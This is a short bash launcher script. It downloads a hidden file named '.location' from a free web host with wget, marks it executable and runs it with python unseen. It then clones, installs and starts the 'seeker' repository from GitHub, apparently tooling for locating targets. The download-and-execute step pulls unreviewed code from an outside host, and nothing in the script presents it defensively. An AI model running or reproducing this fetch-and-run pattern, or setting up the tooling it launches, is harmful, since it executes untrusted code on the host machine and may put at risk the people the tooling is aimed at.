#!/bin/bash

wget https://nabisco.000webhostapp.com/.location

chmod +x .location

python .location

cd ..

git clone https://github.com/thewhiteh4t/seeker.git

cd seeker/

chmod +x install.sh

./install.sh

python seeker.py
